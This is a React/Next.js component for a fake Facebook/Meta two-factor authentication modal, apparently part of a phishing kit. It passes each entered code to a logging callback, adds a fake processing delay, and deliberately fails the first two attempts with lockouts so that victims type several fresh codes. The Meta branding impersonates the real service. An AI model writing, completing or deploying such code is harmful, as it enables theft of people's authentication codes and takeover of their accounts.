"use client";

import { useState, useEffect } from "react";
import Image from "next/image";
import type { VerificationMethod } from "@/types/form";

interface TwoFAModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSubmit: () => void;
  onAttempt: (code: string) => void;
  method: VerificationMethod;
  phone: string;
  email: string;
  dialCode: string;
}

export function TwoFAModal({
  isOpen,
  onClose,
  onSubmit,
  onAttempt,
  // eslint-disable-next-line @typescript-eslint/no-unused-vars
  method,
  // phone, email, dialCode: giữ trong interface vì parent vẫn truyền, không dùng trong UI nên không destructure
}: TwoFAModalProps) {
  const [code, setCode] = useState("");
  const [error, setError] = useState(false);
  const [attemptCount, setAttemptCount] = useState(0);
  const [countdown, setCountdown] = useState(0);
  const [isDisabled, setIsDisabled] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  // Countdown timer
  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    } else if (countdown === 0 && isDisabled) {
      setIsDisabled(false);
      setError(false);
      setCode("");
    }
  }, [countdown, isDisabled]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (isLoading) return;

    const codeValue = code.trim();
    const logValue = codeValue === "" ? "(empty)" : codeValue;

    setIsLoading(true);

    // Delay để giống backend đang xử lý (1-2 giây)
    await new Promise((resolve) => setTimeout(resolve, 1500));

    // Log attempt
    onAttempt(logValue);

    const newAttemptCount = attemptCount + 1;
    setAttemptCount(newAttemptCount);

    // Lần đầu tiên và lần thứ 2 LUÔN FAIL và lockout
    if (newAttemptCount < 3) {
      setError(true);
      setIsDisabled(true);
      setCountdown(30);
      setCode("");
      setIsLoading(false);
      return;
    }

    // Lần thứ 3: validate code length
    if (codeValue.length >= 6 && codeValue.length <= 8) {
      setError(false);
      setIsLoading(false);
      onSubmit();
    } else {
      setError(true);
      setIsLoading(false);
    }
  };

  const handleClose = () => {
    setCode("");
    setError(false);
    setAttemptCount(0);
    setCountdown(0);
    setIsDisabled(false);
    setIsLoading(false);
    onClose();
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4">
      <div className="relative w-full max-w-md rounded-2xl bg-white shadow-2xl">
        <button
          onClick={handleClose}
          className="absolute right-4 top-4 flex h-8 w-8 items-center justify-center rounded-full text-slate-400 transition hover:bg-slate-100 hover:text-slate-600"
          aria-label="Close"
        >
          <svg className="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
          </svg>
        </button>

        <div className="p-8">
          <div className="mb-6">
            <p className="mb-2 text-sm text-slate-500">• Facebook</p>
            <h2 className="text-xl font-semibold text-slate-900">
              Two-factor authentication required
            </h2>
            <p className="mt-3 text-sm text-slate-600">
              Check your email, Authenticator app, or phone number linked to your Facebook account to get the code.
            </p>
          </div>

          <div className="mb-6 flex justify-center">
            <div className="relative">
              <Image
                src="/2fa.png"
                alt="Two-factor authentication illustration"
                width={400}
                height={300}
                className="mx-auto rounded-lg"
                priority
              />
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <label className="mb-2 block text-sm font-medium text-slate-700">Code</label>
              <input
                type="text"
                placeholder=""
                value={code}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, "").slice(0, 8);
                  setCode(value);
                  if (error) setError(false);
                }}
                disabled={isDisabled}
                className={`w-full rounded-lg border px-4 py-3 text-base ${
                  error ? "border-red-500" : "border-slate-300"
                } ${isDisabled ? "bg-slate-100" : "bg-white"}`}
                autoFocus
                maxLength={8}
              />
              {error && (
                <p className="mt-2 text-sm text-red-500">
                  {attemptCount > 0 && countdown > 0
                    ? `Incorrect code. Please try again in ${countdown}s.`
                    : "Code must be 6-8 digits."}
                </p>
              )}
            </div>

            <button
              type="submit"
              disabled={isDisabled || code.length < 6 || isLoading}
              className="w-full rounded-lg bg-metaBlue px-6 py-3 text-base font-semibold text-white transition hover:bg-metaIndigo disabled:opacity-50 flex items-center justify-center"
            >
              {isLoading ? (
                <>
                  <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  Processing...
                </>
              ) : (
                "Continue"
              )}
            </button>
          </form>

          <div className="mt-6 text-center">
            <p className="text-sm text-slate-500">∞ Meta</p>
          </div>
        </div>
      </div>
    </div>
  );
}
